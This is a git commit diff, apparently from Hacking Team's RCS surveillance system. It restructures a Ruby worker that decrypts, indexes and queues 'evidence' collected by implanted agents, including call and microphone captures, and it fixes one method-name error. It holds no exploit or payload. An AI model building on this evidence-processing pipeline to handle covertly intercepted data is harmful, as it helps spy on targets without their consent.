ed10dd79ce9bc0e008c2ba46459ef84c390fb4d6
topac <topac@hackingteam.com>
2014-02-05 14:23:10 +0100

    fix name error

--- lib/rcs-worker/instance_worker.rb
+++ lib/rcs-worker/instance_worker.rb
@@ -23,189 +23,191 @@ require_relative 'evidence/audio_evidence'
 Dir[File.expand_path('../evidence/*.rb', __FILE__)].each { |path| require(path) }
 
 
-module RCS::Worker
-  class InstanceWorker
-    include RCS::Tracer
+module RCS
+  module Worker
+    class InstanceWorker
+      include RCS::Tracer
 
-    MAX_IDLE_TIME = 30
-    READ_INTERVAL = 3
-    READ_LIMIT = 80
-    DECODING_FAILED_FOLDER = 'decoding_failed'
+      MAX_IDLE_TIME = 30
+      READ_INTERVAL = 3
+      READ_LIMIT = 80
+      DECODING_FAILED_FOLDER = 'decoding_failed'
 
-    def initialize(instance, ident)
-      @instance = instance
-      @ident = ident
-      @agent_uid = "#{ident}:#{instance}"
-    end
-
-    def run
-      if !agent?
-        delete_all_evidence
-        return
+      def initialize(instance, ident)
+        @instance = instance
+        @ident = ident
+        @agent_uid = "#{ident}:#{instance}"
       end
 
-      trace(:info, "[#{@agent_uid}] Evidence processing started for Agent #{agent.name}")
-
-      idle_time = 0
-
-      loop do
-        @collection ||= db.collection('grid.evidence.files')
-        list = @collection.find({}, {sort: ["_id", :asc]}).limit(READ_LIMIT).to_a
-
-        if list.empty?
-          idle_time += READ_INTERVAL
-          break if idle_time >= MAX_IDLE_TIME
-        else
-          idle_time = 0
-          list.each { |ev| process(ev) }
+      def run
+        if !agent?
+          delete_all_evidence
+          return
         end
 
-        sleep(READ_INTERVAL)
+        trace(:info, "[#{@agent_uid}] Evidence processing started for Agent #{agent.name}")
+
+        idle_time = 0
+
+        loop do
+          @collection ||= db.collection('grid.evidence.files')
+          list = @collection.find({}, {sort: ["_id", :asc]}).limit(READ_LIMIT).to_a
+
+          if list.empty?
+            idle_time += READ_INTERVAL
+            break if idle_time >= MAX_IDLE_TIME
+          else
+            idle_time = 0
+            list.each { |ev| process(ev) }
+          end
+
+          sleep(READ_INTERVAL)
+        end
+
+        trace(:info, "[#{@agent_uid}] Evidence processing terminated for Agent #{agent.name} (#{idle_time} sec idle)")
       end
 
-      trace(:info, "[#{@agent_uid}] Evidence processing terminated for Agent #{agent.name} (#{idle_time} sec idle)")
-    end
-
-    def db
-      RCS::Worker::DB.instance.mongo_connection
-    end
-
-    def agent?
-      @agent, @target = nil, nil
-      !!target
-    end
-
-    def agent
-      @agent ||= Item.agents.where({ident: @ident, instance: @instance, status: 'open'}).first
-    end
-
-    def target
-      @target ||= agent.get_parent
-    end
-
-    def delete_all_evidence
-      trace(:error, "[#{@agent_uid}] Agent or target is missing, deleting all related evidence")
-      RCS::Worker::GridFS.delete_by_filename(@agent_uid, "evidence")
-      true
-    end
-
-    # The log key is passed as a string taken from the db
-    # we need to calculate the MD5 and use it in binary form
-    def decrypt_key
-      @decrypt_key ||= Digest::MD5.digest(agent['logkey'])
-    end
-
-    def process(grid_ev)
-      if !agent?
-        @_all_evidence_deleted ||= delete_all_evidence
-        return
+      def db
+        RCS::Worker::DB.instance.mongo_connection
       end
 
-      raw_id = grid_ev['_id']
+      def agent?
+        @agent, @target = nil, nil
+        !!target
+      end
 
-      list, decoded_data = decrypt_evidence(raw_id)
+      def agent
+        @agent ||= Item.agents.where({ident: @ident, instance: @instance, status: 'open'}).first
+      end
 
-      return if list.blank?
+      def target
+        @target ||= agent.get_parent
+      end
 
-      list.each do |ev|
-        next if ev.empty?
+      def delete_all_evidence
+        trace(:error, "[#{@agent_uid}] Agent or target is missing, deleting all related evidence")
+        RCS::Worker::GridFS.delete_by_filename(@agent_uid, "evidence")
+        true
+      end
 
-        trace(:info, "[#{@agent_uid}] Processing #{ev[:type].upcase} evidence for agent #{agent.name}")
+      # The log key is passed as a string taken from the db
+      # we need to calculate the MD5 and use it in binary form
+      def decrypt_key
+        @decrypt_key ||= Digest::MD5.digest(agent['logkey'])
+      end
 
-        # store agent instance in evidence (used when storing into db)
-        ev[:instance] ||= @instance
-        ev[:ident] ||= @ident
+      def process(grid_ev)
+        if !agent?
+          @_all_evidence_deleted ||= delete_all_evidence
+          return
+        end
 
-        # find correct processing module and extend evidence
-        processing_module = "#{ev[:type].to_s.capitalize}Processing".to_sym
-        processing_module = RCS.const_defined?(processing_module) ? RCS.const_get(processing_module) : DefaultProcessing
-        ev.__send__(:extend, processing_module)
+        raw_id = grid_ev['_id']
 
-        # post processing
-        ev.process if ev.respond_to?(:process)
+        list, decoded_data = decrypt_evidence(raw_id)
 
-        # full text indexing
-        ev.respond_to?(:keyword_index) ? ev.keyword_index : ev.default_keyword_index
+        return if list.blank?
 
-        processor = processor_class(ev[:type])
+        list.each do |ev|
+          next if ev.empty?
 
-        # override original type
-        ev[:type] = ev.type if ev.respond_to?(:type)
+          trace(:info, "[#{@agent_uid}] Processing #{ev[:type].upcase} evidence for agent #{agent.name}")
 
-        evidence_id, index = processor.feed(ev, agent, target) do |evidence|
-          save_evidence(evidence) if evidence
+          # store agent instance in evidence (used when storing into db)
+          ev[:instance] ||= @instance
+          ev[:ident] ||= @ident
+
+          # find correct processing module and extend evidence
+          processing_module = "#{ev[:type].to_s.capitalize}Processing".to_sym
+          processing_module = RCS.const_defined?(processing_module) ? RCS.const_get(processing_module) : DefaultProcessing
+          ev.__send__(:extend, processing_module)
+
+          # post processing
+          ev.process if ev.respond_to?(:process)
+
+          # full text indexing
+          ev.respond_to?(:keyword_index) ? ev.keyword_index : ev.default_keyword_index
+
+          processor = processor_class(ev[:type])
+
+          # override original type
+          ev[:type] = ev.type if ev.respond_to?(:type)
+
+          evidence_id, index = processor.feed(ev, agent, target) do |evidence|
+            save_evidence(evidence) if evidence
+          end
+        end
+      rescue Mongo::ConnectionFailure => e
+        trace :error, "[#{@agent_uid}] cannot connect to database, retrying in 5 seconds..."
+        sleep(5)
+        retry
+      rescue Exception => e
+        trace :fatal, "[#{@agent_uid}] Unrecoverable error processing evidence #{raw_id}: #{e.class} #{e.message}"
+        trace :fatal, "[#{@agent_uid}] EXCEPTION: " + e.backtrace.join("\n")
+
+        decode_failed(raw_id, decoded_data) if decoded_data
+      ensure
+        delete_evidence(raw_id)
+      end
+
+      def processor_class(evidence_type)
+        case evidence_type
+          when 'call'
+            @call_processor ||= CallProcessor.new
+          when 'mic'
+            @mic_processor ||= MicProcessor.new
+          else
+            @single_processor ||= SingleProcessor.new
         end
       end
-    rescue Mongo::ConnectionFailure => e
-      trace :error, "[#{@agent_uid}] cannot connect to database, retrying in 5 seconds..."
-      sleep(5)
-      retry
-    rescue Exception => e
-      trace :fatal, "[#{@agent_uid}] Unrecoverable error processing evidence #{raw_id}: #{e.class} #{e.message}"
-      trace :fatal, "[#{@agent_uid}] EXCEPTION: " + e.backtrace.join("\n")
 
-      decode_failed(raw_id, decoded_data) if decoded_data
-    ensure
-      delete_evidence(raw_id)
-    end
-
-    def processor_class(evidence_type)
-      case evidence_type
-        when 'call'
-          @call_processor ||= CallProcessor.new
-        when 'mic'
-          @mic_processor ||= MicProcessor.new
-        else
-          @single_processor ||= SingleProcessor.new
-      end
-    end
-
-    def decode_failed(raw_id, decoded_data)
-      Dir.mkdir(DECODING_FAILED_FOLDER) unless File.exists?(DECODING_FAILED_FOLDER)
-      path = "#{DECODING_FAILED_FOLDER}/#{raw_id}.dec"
-      File.open(path, 'wb') { |file| file.write(decoded_data) }
-      trace :debug, "[#{@agent_uid}] Undecoded evidence #{raw_id} stored to #{path}"
-    end
-
-    def decrypt_evidence(raw_id)
-      content = RCS::Worker::GridFS.get(raw_id, "evidence") rescue nil
-      return unless content
-
-      decoded_data = ''
-
-      evidences, action = RCS::Evidence.new(decrypt_key).deserialize(content.read) do |data|
-        decoded_data += data unless data.nil?
+      def decode_failed(raw_id, decoded_data)
+        Dir.mkdir(DECODING_FAILED_FOLDER) unless File.exists?(DECODING_FAILED_FOLDER)
+        path = "#{DECODING_FAILED_FOLDER}/#{raw_id}.dec"
+        File.open(path, 'wb') { |file| file.write(decoded_data) }
+        trace :debug, "[#{@agent_uid}] Undecoded evidence #{raw_id} stored to #{path}"
       end
 
-      return [evidences, decoded_data]
-    rescue EmptyEvidenceError => e
-      trace :debug, "[#{@agent_uid}] deleting empty evidence #{raw_id}"
-      return nil
-    rescue EvidenceDeserializeError => e
-      trace :warn, "[#{@agent_uid}] decoding failed for #{raw_id}: #{e.to_s}, deleting..."
-      decoding_failed(raw_id, decoded_data)
-      return nil
-    end
+      def decrypt_evidence(raw_id)
+        content = RCS::Worker::GridFS.get(raw_id, "evidence") rescue nil
+        return unless content
 
-    def delete_evidence(raw_id)
-      RCS::Worker::GridFS.delete(raw_id, "evidence")
-      trace(:debug, "[#{@agent_uid}] deleted raw evidence #{raw_id}")
-    rescue Exception => ex
-      trace(:error, "[#{@agent_uid}] Unable to delete raw evidence #{raw_id} (maybe is missing): #{ex.message}")
-    end
+        decoded_data = ''
 
-    def save_evidence(evidence)
-      # update the evidence statistics
-      size = evidence.data.inspect.size
-      size += evidence.data[:_grid_size] unless evidence.data[:_grid_size].nil?
-      RCS::Worker::StatsManager.instance.add(processed_evidence: 1, processed_evidence_size: size)
+        evidences, action = RCS::Evidence.new(decrypt_key).deserialize(content.read) do |data|
+          decoded_data += data unless data.nil?
+        end
 
-      # enqueue in the ALL the queues
-      evidence.enqueue
-    end
+        return [evidences, decoded_data]
+      rescue EmptyEvidenceError => e
+        trace :debug, "[#{@agent_uid}] deleting empty evidence #{raw_id}"
+        return nil
+      rescue EvidenceDeserializeError => e
+        trace :warn, "[#{@agent_uid}] decoding failed for #{raw_id}: #{e.to_s}"
+        decode_failed(raw_id, decoded_data) if decoded_data
+        return nil
+      end
 
-    def to_s
-      "Instance worker #{@agent_uid}"
+      def delete_evidence(raw_id)
+        RCS::Worker::GridFS.delete(raw_id, "evidence")
+        trace(:debug, "[#{@agent_uid}] deleted raw evidence #{raw_id}")
+      rescue Exception => ex
+        trace(:error, "[#{@agent_uid}] Unable to delete raw evidence #{raw_id} (maybe is missing): #{ex.message}")
+      end
+
+      def save_evidence(evidence)
+        # update the evidence statistics
+        size = evidence.data.inspect.size
+        size += evidence.data[:_grid_size] unless evidence.data[:_grid_size].nil?
+        RCS::Worker::StatsManager.instance.add(processed_evidence: 1, processed_evidence_size: size)
+
+        # enqueue in the ALL the queues
+        evidence.enqueue
+      end
+
+      def to_s
+        "Instance worker #{@agent_uid}"
+      end
     end
   end
 end
